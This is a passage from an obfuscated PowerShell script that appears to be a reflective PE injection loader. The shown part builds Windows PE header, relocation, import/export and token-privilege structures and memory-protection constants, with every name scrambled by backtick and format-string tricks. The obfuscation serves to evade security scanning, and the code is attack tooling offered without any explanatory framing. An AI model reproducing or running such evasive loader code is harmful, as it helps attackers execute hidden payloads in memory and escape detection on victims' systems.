		${TY`pEbui`l`DeR}.("{2}{1}{3}{0}"-f 'd','efineFie','D','l').Invoke(("{1}{0}"-f'lp','e_cb'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{2}{0}{1}" -f 'ul','l','Out-N')
		${tYpE`BUI`lD`ER}.("{1}{0}{3}{2}" -f 'ef','D','ld','ineFie').Invoke(("{0}{1}"-f 'e_c','p'), [UInt16], ("{1}{2}{0}"-f 'ic','Pu','bl')) | &("{1}{2}{0}" -f 'll','Out-','Nu')
		${t`ypE`B`Uilder}.("{3}{2}{1}{0}"-f'd','fineFiel','e','D').Invoke(("{0}{2}{1}"-f 'e','c','_crl'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
		${TyPEb`U`i`LDeR}.("{1}{2}{0}"-f 'd','DefineFi','el').Invoke(("{0}{2}{1}"-f'e','r','_cparhd'), [UInt16], ("{0}{1}"-f'Publi','c')) | &("{0}{1}" -f'Out-','Null')
		${T`YPeb`UiL`deR}.("{1}{2}{0}" -f'eField','D','efin').Invoke(("{2}{1}{0}" -f 'lloc','ina','e_m'), [UInt16], ("{0}{2}{1}"-f 'P','lic','ub')) | &("{2}{0}{1}" -f'ul','l','Out-N')
		${tY`pEbui`lDeR}.("{2}{0}{1}{3}"-f'Fie','l','Define','d').Invoke(("{3}{2}{0}{1}" -f 'l','oc','_maxal','e'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{2}{1}{0}"-f 'l','ut-Nul','O')
		${TyPebu`I`LdEr}.("{1}{2}{0}" -f'ld','DefineFi','e').Invoke(("{0}{1}" -f 'e_s','s'), [UInt16], ("{0}{1}" -f'Pu','blic')) | &("{1}{2}{0}" -f'-Null','Ou','t')
		${t`yPeBUi`ldEr}.("{2}{1}{0}" -f'd','ineFiel','Def').Invoke(("{0}{1}"-f 'e_','sp'), [UInt16], ("{0}{2}{1}" -f 'Publ','c','i')) | &("{0}{2}{1}" -f'Out-Nu','l','l')
		${tYp`eBU`I`LDEr}.("{2}{1}{0}{3}"-f'ineFie','f','De','ld').Invoke(("{1}{0}"-f 'sum','e_c'), [UInt16], ("{0}{2}{1}" -f 'Pu','lic','b')) | &("{1}{0}"-f'ull','Out-N')
		${t`YpEbu`I`lDeR}.("{2}{0}{3}{1}" -f'efin','ld','D','eFie').Invoke(("{1}{0}"-f'p','e_i'), [UInt16], ("{0}{1}"-f'Publi','c')) | &("{2}{1}{0}" -f'l','l','Out-Nu')
		${ty`pEB`UILD`eR}.("{0}{3}{2}{1}" -f 'Define','d','el','Fi').Invoke(("{0}{1}"-f 'e_c','s'), [UInt16], ("{1}{0}" -f'lic','Pub')) | &("{0}{1}" -f 'Out-','Null')
		${Ty`pEb`U`iLdeR}.("{0}{3}{2}{1}"-f 'De','ld','neFie','fi').Invoke(("{0}{1}{2}"-f 'e_lf','a','rlc'), [UInt16], ("{0}{1}"-f 'P','ublic')) | &("{1}{2}{0}" -f'ull','Out','-N')
		${tYPEB`U`IL`dEr}.("{2}{0}{1}"-f 'efine','Field','D').Invoke(("{0}{1}"-f 'e_o','vno'), [UInt16], ("{0}{1}" -f 'Publi','c')) | &("{1}{0}"-f'll','Out-Nu')

		${e`_ReSfiE`Ld} = ${tY`pEBuILD`eR}.("{2}{0}{1}" -f 'ne','Field','Defi').Invoke(("{1}{0}"-f '_res','e'), [UInt16[]], ("{2}{4}{0}{3}{1}"-f 'sFieldM','rshal','Publ','a','ic, Ha'))
		${CoNst`RuC`T`OrVa`LuE} =  ${TfNL`G2}::"BY`VAlAR`RAy"
		${fi`el`DArr`Ay} = @(  ${3P`Bk`gm}.("{1}{2}{0}" -f'ld','GetFi','e').Invoke(("{2}{0}{1}" -f 'zeCon','st','Si')))
		${ATtRibbU`i`L`deR} = &("{2}{1}{0}"-f'bject','ew-O','N') ("{5}{7}{1}{13}{6}{8}{3}{4}{0}{11}{12}{9}{10}{2}" -f 'mA','m.Reflectio','Builder','Cus','to','S','Emit','yste','.','ib','ute','t','tr','n.')(${Con`sTRuC`TOr`In`FO}, ${c`OnSTruct`o`RVal`UE}, ${FiE`Lda`RRAy}, @([Int32] 4))
		${E_`R`e`SfIeld}.("{2}{1}{3}{0}"-f'tomAttribute','u','SetC','s').Invoke(${atT`RIB`BUIl`Der})

		${T`YpebU`IlDEr}.("{0}{2}{1}"-f'De','Field','fine').Invoke(("{2}{0}{1}"-f'mi','d','e_oe'), [UInt16], ("{0}{2}{1}" -f'Pu','c','bli')) | &("{1}{0}{2}"-f 'Nul','Out-','l')
		${tYPeBUIl`d`Er}.("{0}{2}{1}{3}" -f 'De','neFie','fi','ld').Invoke(("{0}{1}{2}"-f'e','_oem','info'), [UInt16], ("{0}{1}" -f'Pub','lic')) | &("{2}{1}{0}" -f'-Null','ut','O')

		${e_R`Es`2FiE`ld} = ${T`yPeB`U`ilDER}.("{1}{0}{2}{3}" -f'Fi','Define','e','ld').Invoke(("{2}{1}{0}" -f 'es2','_r','e'), [UInt16[]], ("{0}{5}{3}{2}{4}{1}"-f'P','hal','lic, HasF','b','ieldMars','u'))
		${C`oNS`Tru`CTorvalue} =  (GcI  ("{3}{1}{2}{0}"-f 'Lg2','aBLe:t','fN','VaRi') )."v`Alue"::"BYV`AlA`R`RAY"
		${aT`TRIBBUild`Er} = &("{2}{0}{1}" -f'-','Object','New') ("{1}{4}{3}{5}{8}{2}{6}{9}{7}{0}{10}"-f'B','Syst','it','m.Ref','e','lectio','.','te','n.Em','CustomAttribu','uilder')(${c`OnS`TRU`CTOr`infO}, ${COnstRuCtO`R`V`Alue}, ${Fi`E`LDarR`Ay}, @([Int32] 10))
		${e`_r`Es2fie`Ld}.("{0}{2}{3}{1}{4}" -f'Se','tomAttribu','tC','us','te').Invoke(${A`TtRibbUI`L`DeR})

		${TyPe`BU`I`Lder}.("{2}{0}{1}"-f'iel','d','DefineF').Invoke(("{2}{0}{1}" -f'fane','w','e_l'), [Int32], ("{1}{2}{0}"-f'blic','P','u')) | &("{1}{2}{0}" -f'ull','O','ut-N')
		${ImAGe_D`Os`_h`EA`dEr} = ${Ty`PE`BUi`ldER}.("{3}{2}{0}{1}"-f'eTyp','e','eat','Cr').Invoke()	
		${WI`N3`2T`yPES} | &("{0}{1}{2}" -f 'Add-M','emb','er') -MemberType ("{2}{0}{1}" -f'ePropert','y','Not') -Name ("{1}{2}{0}{3}"-f 'EAD','IMAGE','_DOS_H','ER') -Value ${Im`Ag`e_d`OS`_He`ADEr}


		${atTRIb`U`TES} = ("{6}{7}{12}{2}{22}{8}{1}{9}{20}{14}{17}{3}{13}{21}{16}{0}{18}{19}{5}{10}{11}{4}{15}" -f 'o','ass','Lay','lic,','i','d, Befor','A','u','nsiCl',', C','eFiel','dIn','to',' Seq','ss, P','t','lLay','ub','ut, Sea','le','la','uentia','out, A')
		${TY`Pe`BUiLder} = ${mO`DUl`e`BuIL`dER}.("{0}{2}{1}" -f'Defi','eType','n').Invoke(("{3}{2}{1}{4}{0}"-f 'R','_HE','ON','IMAGE_SECTI','ADE'), ${aTT`RIbu`TEs}, [System.ValueType], 40)

		${nAMEf`I`ElD} = ${tYPeb`UI`Lder}.("{0}{2}{3}{1}" -f 'Defin','ld','eF','ie').Invoke(("{1}{0}" -f 'e','Nam'), [Char[]], ("{6}{5}{1}{0}{4}{3}{2}"-f'ic, Has','l','ldMarshal','e','Fi','ub','P'))
		${cOn`S`Tr`UcT`ORvALUe} =  (  get-vaRiAbLE ("tFnlg"+"2") -VALuE )::"ByV`ALA`RrAy"
		${AtT`RibBU`I`lD`eR} = &("{0}{2}{1}" -f'N','ect','ew-Obj') ("{4}{1}{9}{6}{3}{5}{8}{2}{7}{0}"-f 'uilder','y','to','flect','S','ion.Emit.Cu','em.Re','mAttributeB','s','st')(${c`ONSTRUct`o`R`iNfO}, ${cO`NsTRuc`ToRvaL`Ue}, ${f`i`E`ldArraY}, @([Int32] 8))
		${nAmeF`iE`ld}.("{1}{0}{4}{2}{3}" -f 'm','SetCusto','ribu','te','Att').Invoke(${At`TrI`B`Bu`ildER})

		${tY`pE`Bui`LdER}.("{0}{2}{1}"-f'Defi','Field','ne').Invoke(("{1}{2}{0}" -f 'ze','Virtu','alSi'), [UInt32], ("{2}{1}{0}"-f 'c','bli','Pu')) | &("{0}{1}{2}" -f'Ou','t-N','ull')
		${TY`PEB`UiL`dEr}.("{2}{3}{1}{0}"-f 'd','eFiel','D','efin').Invoke(("{2}{0}{3}{1}"-f'irtualAddr','s','V','es'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}{2}" -f 'Out','-Nu','ll')
		${TYPE`BuILd`er}.("{0}{3}{2}{1}" -f'DefineF','d','el','i').Invoke(("{1}{4}{0}{2}{3}" -f 'RawDa','Siz','t','a','eOf'), [UInt32], ("{1}{0}{2}"-f'b','Pu','lic')) | &("{2}{1}{0}"-f'Null','-','Out')
		${T`yp`EbU`ildEr}.("{0}{2}{1}" -f 'Def','eld','ineFi').Invoke(("{1}{3}{4}{0}{2}"-f'oRawDa','P','ta','ointer','T'), [UInt32], ("{0}{2}{1}"-f 'P','c','ubli')) | &("{1}{0}{2}" -f'ut-','O','Null')
		${tYPeb`U`I`ldEr}.("{2}{1}{0}" -f 'eld','fineFi','De').Invoke(("{0}{3}{1}{2}{4}" -f'Point','c','a','erToRelo','tions'), [UInt32], ("{2}{1}{0}" -f 'blic','u','P')) | &("{2}{1}{0}" -f 'l','ul','Out-N')
		${t`Yp`EBuiL`deR}.("{2}{0}{1}"-f'efi','neField','D').Invoke(("{3}{4}{1}{0}{5}{2}"-f 'oLinenu','T','bers','Po','inter','m'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{0}{1}"-f'Out-Nu','ll')
		${tyPE`B`UIl`Der}.("{3}{1}{0}{2}" -f'l','ie','d','DefineF').Invoke(("{1}{3}{2}{0}" -f'ons','Num','Relocati','berOf'), [UInt16], ("{0}{1}{2}" -f 'P','u','blic')) | &("{2}{1}{0}"-f 'l','ul','Out-N')
		${TYPEb`Ui`LDer}.("{2}{1}{0}"-f 'd','fineFiel','De').Invoke(("{3}{2}{5}{4}{0}{1}"-f'mber','s','um','N','OfLinenu','ber'), [UInt16], ("{0}{1}" -f'P','ublic')) | &("{1}{2}{0}"-f 'ull','Ou','t-N')
		${ty`PEbUI`LDer}.("{1}{2}{0}"-f'd','Defin','eFiel').Invoke(("{2}{0}{1}" -f'tic','s','Characteris'), [UInt32], ("{0}{2}{1}"-f'P','ic','ubl')) | &("{2}{0}{1}" -f 'ul','l','Out-N')
		${iMA`ge`_Se`C`TIo`N_h`EAdEr} = ${t`YpE`B`UiLDER}.("{0}{1}{3}{2}" -f 'Cre','a','ype','teT').Invoke()
		${WI`N32T`yp`es} | &("{1}{0}{2}"-f 'Me','Add-','mber') -MemberType ("{1}{0}{3}{2}"-f't','No','ty','eProper') -Name ("{3}{0}{1}{2}" -f 'A','GE_SECT','ION_HEADER','IM') -Value ${imagE_se`ctI`ON`_heAdeR}


		${a`TtR`iBUTEs} = ("{15}{14}{11}{0}{7}{10}{3}{2}{1}{17}{18}{19}{16}{4}{9}{5}{12}{8}{6}{13}"-f'ut,',', Cl','Class','si','tialL','out, Sea','B',' A','ed, ','ay','n','Layo','l','eforeFieldInit','o','Aut','c, Sequen','ass, P','ub','li')
		${Ty`PE`BuIlDER} = ${ModuL`Eb`U`il`Der}.("{2}{1}{0}"-f'eType','n','Defi').Invoke(("{2}{4}{1}{0}{3}"-f 'CATIO','LO','IMAGE_B','N','ASE_RE'), ${A`TtRI`BuTEs}, [System.ValueType], 8)
		${tY`pEBui`LdeR}.("{0}{1}{2}" -f'Def','i','neField').Invoke(("{1}{2}{0}" -f'ress','Virtua','lAdd'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}" -f'ut-Null','O')
		${T`YpE`BUi`lDER}.("{1}{2}{0}" -f'd','DefineFie','l').Invoke(("{2}{0}{1}" -f'OfBl','ock','Size'), [UInt32], ("{0}{1}" -f'Publ','ic')) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
		${ImAG`E_`BasE`_`ReLOc`ATI`on} = ${T`Y`PebUI`LdeR}.("{2}{1}{0}"-f 'Type','ate','Cre').Invoke()
		${Win3`2TyP`es} | &("{2}{0}{1}" -f'dd-','Member','A') -MemberType ("{2}{0}{3}{1}"-f'ePr','ty','Not','oper') -Name ("{2}{3}{4}{1}{0}"-f 'ATION','OC','IMAG','E_BASE_R','EL') -Value ${iMA`GE_baSE_R`E`L`OcaT`iON}


		${attR`IbUt`ES} = ("{7}{4}{0}{2}{5}{1}{6}{9}{8}{12}{3}{11}{10}" -f'Layou',', Cl','t, Ansi',' Sealed','uto','Class','ass, Public, S','A','tia','equen','oreFieldInit',', Bef','lLayout,')
		${T`y`p`ebUildeR} = ${Mod`ULeb`UiLD`ER}.("{0}{1}{2}"-f'De','fin','eType').Invoke(("{2}{3}{1}{4}{0}"-f 'PTOR','RT_DE','IM','AGE_IMPO','SCRI'), ${Attrib`U`TES}, [System.ValueType], 20)
		${tYpE`B`UIl`dEr}.("{0}{1}{2}" -f'De','fine','Field').Invoke(("{1}{0}{2}{3}"-f 't','Charac','eristic','s'), [UInt32], ("{2}{1}{0}"-f'c','li','Pub')) | &("{0}{1}{2}"-f 'O','u','t-Null')
		${ty`peB`UIldER}.("{3}{0}{2}{1}"-f 'e','eld','Fi','Defin').Invoke(("{1}{2}{3}{0}" -f 'teStamp','T','im','eDa'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{0}{1}" -f 'Out','-Null')
		${T`YpE`BUiLD`ER}.("{2}{3}{0}{1}"-f'Fiel','d','D','efine').Invoke(("{1}{2}{0}" -f 'n','Forw','arderChai'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{1}{0}{2}" -f '-Nu','Out','ll')
		${Ty`p`EB`UiLdeR}.("{2}{0}{3}{1}"-f 'ef','eField','D','in').Invoke(("{0}{1}"-f 'Na','me'), [UInt32], ("{2}{1}{0}"-f'c','li','Pub')) | &("{0}{1}"-f'Out','-Null')
		${TypeBUI`l`dEr}.("{0}{1}{2}" -f 'Define','Fiel','d').Invoke(("{0}{1}{2}"-f 'Firs','tThun','k'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{0}{2}{1}" -f 'Out-N','l','ul')
		${IMAgE`_`ImpOr`T_dESCr`i`PTOr} = ${Ty`Peb`Ui`ldeR}.("{1}{0}{2}"-f 'eT','Creat','ype').Invoke()
		${win3`2`TyP`Es} | &("{0}{1}{2}" -f'Add-','M','ember') -MemberType ("{3}{2}{0}{1}"-f 'Proper','ty','ote','N') -Name ("{3}{4}{0}{2}{1}{5}" -f 'MPOR','ESCR','T_D','IMAGE','_I','IPTOR') -Value ${iM`AGe`_IM`pO`RT_DEsCR`I`Ptor}


		${att`RibU`TEs} = ("{5}{2}{0}{12}{18}{8}{17}{19}{13}{7}{14}{10}{4}{6}{15}{11}{1}{9}{3}{20}{16}" -f ',',' ','t','eFi','out','AutoLayou',',','Sequen','iClass','Befor','y','Sealed,',' An',', ','tialLa',' ','t',', Cla','s','ss, Public','eldIni')
		${ty`p`E`BUilDER} = ${mo`duLE`BUi`LD`ER}.("{2}{1}{0}" -f 'eType','efin','D').Invoke(("{1}{3}{0}{5}{4}{6}{2}" -f 'E_EXPO','IMA','ORY','G','E','RT_DIR','CT'), ${a`TTRib`U`Tes}, [System.ValueType], 40)
		${tYPeB`U`Il`DER}.("{2}{0}{1}{3}"-f 'in','eFi','Def','eld').Invoke(("{1}{3}{2}{0}" -f's','Char','eristic','act'), [UInt32], ("{1}{0}"-f 'ic','Publ')) | &("{2}{1}{0}"-f'l','t-Nul','Ou')
		${tYPE`BUi`l`dEr}.("{0}{1}{2}"-f'Defin','eF','ield').Invoke(("{4}{2}{0}{3}{1}" -f'meD','amp','i','ateSt','T'), [UInt32], ("{0}{2}{1}" -f'Publ','c','i')) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
		${tyPEbU`il`d`Er}.("{1}{0}{2}{3}" -f 'efin','D','eF','ield').Invoke(("{3}{2}{0}{1}"-f'sio','n','er','MajorV'), [UInt16], ("{1}{0}"-f 'c','Publi')) | &("{2}{1}{0}"-f 'l','t-Nul','Ou')
		${Ty`pe`BuIlDer}.("{1}{3}{0}{2}" -f 'Fiel','D','d','efine').Invoke(("{3}{0}{1}{2}" -f'inorVe','rs','ion','M'), [UInt16], ("{2}{0}{1}" -f 'bl','ic','Pu')) | &("{0}{1}{2}" -f'Out','-Nu','ll')
		${TYp`eb`UiL`DeR}.("{2}{0}{3}{1}"-f'in','Field','Def','e').Invoke(("{0}{1}"-f'Na','me'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{0}{2}{1}" -f 'Ou','ull','t-N')
		${T`yPEB`UILder}.("{0}{3}{2}{1}"-f'De','ld','ineFie','f').Invoke(("{1}{0}" -f 'e','Bas'), [UInt32], ("{2}{0}{1}" -f 'ubli','c','P')) | &("{2}{0}{1}"-f'-Nu','ll','Out')
		${typE`Bu`iLDEr}.("{0}{2}{1}"-f 'Define','d','Fiel').Invoke(("{0}{4}{2}{3}{1}"-f'Number','tions','Fu','nc','Of'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{1}" -f 'Out-N','ull')
		${t`yp`ebUILd`ER}.("{1}{0}{2}" -f'Fi','Define','eld').Invoke(("{0}{2}{1}" -f 'Numbe','ames','rOfN'), [UInt32], ("{2}{0}{1}"-f'u','blic','P')) | &("{1}{0}" -f'ut-Null','O')
		${tY`pe`BUiLd`er}.("{0}{1}{2}" -f'Def','in','eField').Invoke(("{0}{2}{1}{3}{4}"-f'Add','sO','res','fFunc','tions'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{1}{0}" -f 'll','Out-Nu')
		${TyP`ebui`lDER}.("{0}{1}{2}{3}" -f'DefineF','ie','l','d').Invoke(("{2}{1}{3}{0}" -f'Names','r','Add','essOf'), [UInt32], ("{0}{2}{1}"-f 'Pub','ic','l')) | &("{1}{0}{2}" -f'l','Out-Nu','l')
		${ty`PE`BUi`lDeR}.("{1}{2}{0}" -f'ineField','De','f').Invoke(("{0}{5}{4}{1}{3}{2}{6}"-f'Addre','m','rdin','eO','sOfNa','s','als'), [UInt32], ("{1}{0}{2}"-f 'li','Pub','c')) | &("{1}{0}"-f 'll','Out-Nu')
		${imA`g`e_eXp`Or`T_diRE`cToRY} = ${TyPeBuI`l`dEr}.("{0}{2}{3}{1}" -f'C','teType','r','ea').Invoke()
		${WIn3`2tY`PeS} | &("{0}{3}{1}{2}" -f 'A','mbe','r','dd-Me') -MemberType ("{0}{2}{1}{3}" -f 'Note','ro','P','perty') -Name ("{0}{4}{2}{3}{1}{5}" -f'IM','TOR','_EXPORT_D','IREC','AGE','Y') -Value ${I`ma`G`e_Ex`port_`DiREcT`ory}
		

		${attri`Bu`Tes} = ("{0}{3}{5}{4}{2}{1}{12}{8}{10}{6}{13}{7}{11}{9}" -f 'Auto',' Cla','ss,','Lay','a','out, AnsiCl','yout, ','foreFie','Sequen','t','tialLa','ldIni','ss, Public, ','Sealed, Be')
		${T`Y`pe`BUiLDEr} = ${M`oDu`Le`BU`ILDEr}.("{0}{1}{2}"-f 'D','efineTy','pe').Invoke(("{0}{1}"-f 'LU','ID'), ${ATtRI`BU`TeS}, [System.ValueType], 8)
		${t`y`PE`BUiLder}.("{2}{0}{1}"-f'n','eField','Defi').Invoke(("{2}{1}{0}" -f 'art','owP','L'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{0}{2}{1}"-f'O','l','ut-Nul')
		${TY`p`EbUIlder}.("{0}{1}{2}" -f'Define','Fiel','d').Invoke(("{0}{1}{2}"-f'Hi','ghPar','t'), [UInt32], ("{0}{1}"-f 'Publi','c')) | &("{1}{2}{0}"-f 'll','Ou','t-Nu')
		${LU`id} = ${t`ypE`Bu`iLDEr}.("{2}{1}{0}" -f'eType','at','Cre').Invoke()
		${Wi`N3`2typES} | &("{2}{1}{0}" -f'r','embe','Add-M') -MemberType ("{3}{2}{1}{0}"-f'y','ert','p','NotePro') -Name ("{1}{0}"-f'D','LUI') -Value ${lU`id}
		

		${a`TtRiBUT`ES} = ("{18}{21}{12}{11}{4}{6}{3}{1}{14}{0}{19}{7}{22}{5}{13}{20}{9}{16}{17}{15}{8}{2}{10}" -f 'ub','s, Class,','ldIn','iClas',',','qu',' Ans','S','e','alLayo','it','out','y','e',' P','oreFi','ut, Seale','d, Bef','A','lic, ','nti','utoLa','e')
		${TYPebU`i`lD`ER} = ${MO`dul`EB`U`IlDEr}.("{1}{2}{0}" -f 'pe','Define','Ty').Invoke(("{2}{0}{1}{4}{3}"-f'U','ID_AN','L','IBUTES','D_ATTR'), ${AtTR`Ibu`T`eS}, [System.ValueType], 12)
		${tYpe`B`UIl`der}.("{0}{3}{1}{2}" -f'Def','e','Field','in').Invoke(("{1}{0}" -f 'd','Lui'), ${lu`ID}, ("{0}{1}"-f'P','ublic')) | &("{0}{1}{2}"-f 'Ou','t-Nul','l')
		${T`y`PebUIlD`eR}.("{2}{0}{1}" -f 'ef','ineField','D').Invoke(("{2}{1}{0}"-f's','bute','Attri'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{1}{0}"-f't-Null','Ou')
		${L`U`I`d_`ANd_`AtTR`IBuTES} = ${t`Y`PeBuI`LdEr}.("{0}{1}{2}" -f 'C','rea','teType').Invoke()
		${WI`N3`2T`Ypes} | &("{1}{0}{2}" -f'dd-','A','Member') -MemberType ("{1}{2}{0}{3}"-f'e','NotePro','p','rty') -Name ("{4}{1}{3}{0}{2}" -f 'IBUT','D_A','ES','TTR','LUID_AN') -Value ${lUI`d`_And_Att`RiBut`es}
		

		${aTt`RIB`UtES} = ("{1}{22}{17}{3}{10}{11}{19}{13}{9}{16}{15}{2}{21}{7}{4}{6}{5}{20}{8}{18}{12}{14}{23}{0}" -f 'ldInit','A',' Class, Public','o','en','out, Sea','tialLay','equ','d, Be','Clas','Layo','ut, ','oreF','i','i',',','s','t','f','Ans','le',', S','u','e')
		${tYp`eb`UiLDeR} = ${Modul`E`BuIlDER}.("{3}{2}{1}{0}"-f'Type','e','efin','D').Invoke(("{1}{0}{3}{2}" -f'N_PR','TOKE','VILEGES','I'), ${A`T`TrI`ButES}, [System.ValueType], 16)
		${ty`PEbu`ilDer}.("{1}{2}{0}{3}" -f'eFiel','D','efin','d').Invoke(("{2}{0}{3}{1}" -f 'ivilege','nt','Pr','Cou'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{2}{1}{0}" -f 'l','-Nul','Out')
		${TYpEBu`I`l`DER}.("{3}{0}{2}{1}" -f'fineF','eld','i','De').Invoke(("{0}{2}{1}" -f 'Pr','ileges','iv'), ${L`UiD_`An`D_attriButeS}, ("{1}{0}" -f'c','Publi')) | &("{1}{0}"-f'Null','Out-')
		${tOKEn`_`P`RiVI`lEgES} = ${t`y`p`EbuILdEr}.("{1}{2}{0}"-f'eType','Crea','t').Invoke()
		${wIn32`TY`P`eS} | &("{3}{2}{1}{0}"-f 'mber','e','d-M','Ad') -MemberType ("{1}{2}{0}"-f'erty','NotePro','p') -Name ("{1}{2}{3}{5}{0}{4}" -f 'VI','T','OKE','N_PR','LEGES','I') -Value ${ToK`EN_p`R`iVi`LEgeS}

		return ${wIn`3`2`TypEs}
	}

	Function gET`-win32`CO`NstAnTS
	{
		${wi`N32`cOn`sTAnTs} = &("{2}{1}{0}" -f'ct','e','New-Obj') ("{3}{2}{0}{1}{4}" -f '.Ob','j','stem','Sy','ect')
		
		${w`In32c`O`N`sTAntS} | &("{1}{0}{2}" -f 'm','Add-Me','ber') -MemberType ("{1}{0}{2}"-f 'Pro','Note','perty') -Name ("{2}{0}{1}{3}" -f 'EM_CO','MMI','M','T') -Value 0x00001000
		${Wi`N`32CoN`STANts} | &("{2}{0}{1}{3}"-f 'emb','e','Add-M','r') -MemberType ("{2}{3}{0}{1}" -f'r','operty','No','teP') -Name ("{0}{2}{3}{1}"-f 'M','VE','EM_','RESER') -Value 0x00002000
		${w`in32`CONS`TAnTS} | &("{2}{0}{1}" -f '-Memb','er','Add') -MemberType ("{1}{0}{2}"-f'oteP','N','roperty') -Name ("{2}{3}{1}{0}{4}" -f'OACC','_N','PA','GE','ESS') -Value 0x01
		${w`IN32ConSTa`N`TS} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') -MemberType ("{0}{1}{2}{3}" -f 'No','teP','r','operty') -Name ("{3}{1}{2}{0}{4}" -f'L','E','_READON','PAG','Y') -Value 0x02
		${Win`3`2cO`NsTants} | &("{0}{1}{2}" -f'Add','-Me','mber') -MemberType ("{2}{1}{0}"-f'roperty','teP','No') -Name ("{2}{1}{3}{4}{0}" -f'WRITE','E_R','PAG','E','AD') -Value 0x04
		${win32`C`o`NSTAnTs} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') -MemberType ("{0}{3}{1}{2}"-f'Note','e','rty','Prop') -Name ("{2}{0}{1}"-f 'E_WRI','TECOPY','PAG') -Value 0x08
		${wiN`3`2`CONSt`ANtS} | &("{0}{1}{2}" -f 'Add-Mem','be','r') -MemberType ("{0}{3}{1}{2}"-f 'N','Pr','operty','ote') -Name ("{3}{1}{2}{0}" -f'E','XECU','T','PAGE_E') -Value 0x10
		${w`In32con`STAn`TS} | &("{0}{1}{2}" -f 'Add-Memb','e','r') -MemberType ("{0}{2}{1}"-f'NotePr','erty','op') -Name ("{2}{1}{3}{0}{4}"-f 'R','GE_EX','PA','ECUTE_','EAD') -Value 0x20
		${W`I`N32`cOn`staNTS} | &("{1}{0}{2}"-f'Memb','Add-','er') -MemberType ("{0}{3}{1}{2}"-f'Not','p','erty','ePro') -Name ("{0}{3}{2}{1}"-f 'PAGE_EXECUT','READWRITE','_','E') -Value 0x40
		${wI`N32coN`S`Ta`NTs} | &("{1}{0}{2}"-f 'e','Add-M','mber') -MemberType ("{2}{0}{1}"-f'tePr','operty','No') -Name ("{1}{2}{5}{4}{0}{3}"-f 'E_WRITE','PAG','E_E','COPY','UT','XEC') -Value 0x80
		${w`IN`32cO`N`STAnTs} | &("{0}{1}{2}"-f 'A','dd-Mem','ber') -MemberType ("{2}{3}{1}{0}" -f'y','ert','NotePr','op') -Name ("{3}{2}{0}{1}" -f 'OC','ACHE','E_N','PAG') -Value 0x200
		${WIN32`CONST`AnTS} | &("{1}{2}{0}"-f'-Member','A','dd') -MemberType ("{1}{3}{2}{0}" -f 'rty','No','Prope','te') -Name ("{2}{1}{5}{3}{4}{6}{0}" -f'SOLUTE','_REL','IMAGE','BAS','ED','_','_AB') -Value 0
		${w`iN32c`OnStaNts} | &("{0}{1}{2}" -f 'A','dd-Me','mber') -MemberType ("{2}{1}{0}"-f'erty','Prop','Note') -Name ("{3}{1}{0}{5}{4}{6}{2}"-f'EL_','_R','W','IMAGE','A','B','SED_HIGHLO') -Value 3
		${W`In32`Con`StANtS} | &("{1}{2}{3}{0}" -f 'r','Add','-M','embe') -MemberType ("{1}{0}{2}{3}" -f 'P','Note','rope','rty') -Name ("{4}{0}{5}{3}{2}{1}"-f'R','4','IR6','BASED_D','IMAGE_','EL_') -Value 10
		${wi`N32C`oNst`A`NTS} | &("{2}{1}{0}" -f'ember','-M','Add') -MemberType ("{2}{0}{1}"-f 'rop','erty','NoteP') -Name ("{0}{4}{3}{2}{1}" -f 'IMAGE_SCN_MEM_DISC','E','L','B','ARDA') -Value 0x02000000
		${W`IN32`cONsT`A`NTS} | &("{1}{0}{2}" -f'Memb','Add-','er') -MemberType ("{3}{1}{2}{0}"-f'y','eProp','ert','Not') -Name ("{4}{5}{3}{2}{1}{0}"-f 'TE','XECU','MEM_E','CN_','IM','AGE_S') -Value 0x20000000
		${WI`N32`CO`NSTAnts} | &("{0}{3}{1}{2}" -f'A','mbe','r','dd-Me') -MemberType ("{2}{0}{1}"-f'ePro','perty','Not') -Name ("{4}{1}{2}{0}{3}" -f'RE','CN_MEM','_','AD','IMAGE_S') -Value 0x40000000
		${w`in32co`NS`TAn`TS} | &("{1}{2}{0}"-f 'ember','Add-','M') -MemberType ("{1}{2}{0}"-f 'ty','NoteProp','er') -Name ("{5}{4}{2}{3}{1}{0}"-f'E','_WRIT','E','M','GE_SCN_M','IMA') -Value 0x80000000
		${W`IN32`ConS`TAnTS} | &("{0}{2}{1}"-f'A','ember','dd-M') -MemberType ("{0}{2}{3}{1}" -f 'NotePro','y','pe','rt') -Name ("{4}{0}{3}{2}{1}" -f 'C','T_CACHED','NO','N_MEM_','IMAGE_S') -Value 0x04000000
		${wIn`32CONSTaN`Ts} | &("{0}{1}{2}" -f'A','dd-Memb','er') -MemberType ("{1}{0}{2}{3}" -f 'tePro','No','per','ty') -Name ("{0}{1}{2}"-f 'MEM_DE','COM','MIT') -Value 0x4000
		${W`IN3`2cON`St`AnTs} | &("{1}{0}{2}"-f'em','Add-M','ber') -MemberType ("{1}{2}{0}"-f 'rty','NotePr','ope') -Name ("{8}{1}{0}{5}{4}{2}{6}{7}{3}"-f'E','_FIL','BLE_','E','A','_EXECUT','IM','AG','IMAGE') -Value 0x0002
		${wIN32`CONsta`NtS} | &("{1}{0}{2}{3}" -f'dd-','A','Memb','er') -MemberType ("{2}{1}{0}{3}" -f 'r','e','NoteProp','ty') -Name ("{0}{3}{2}{1}"-f'I','L','FILE_DL','MAGE_') -Value 0x2000
